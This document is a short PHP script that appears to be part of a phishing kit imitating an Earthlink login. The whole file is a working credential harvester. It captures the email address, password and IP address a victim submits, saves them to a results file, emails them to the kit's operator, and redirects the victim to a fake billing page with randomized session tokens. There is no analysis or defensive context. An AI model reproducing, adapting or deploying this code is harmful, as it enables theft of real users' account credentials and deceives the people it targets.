<?php
include '../email.php';
$praga=rand();
$praga=md5($praga);

$ip = getenv("REMOTE_ADDR");
$msg .= "--------------------------------------------------------------\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "--------------------------------------------------------------\n";
$msg .= "Sent from $ip\n";
$msg .= "-------------------------Spamtools.io------------------------------\n";


$subject = "Login Earthlink | $ip";


$file = fopen("../results/login.txt", 'a');
fwrite($file, $msg);

mail($email,$subject,$msg,$from);

header("Location: ../billing.php?cmd=update_submit&id=$praga$praga&session=$praga$praga");


?>
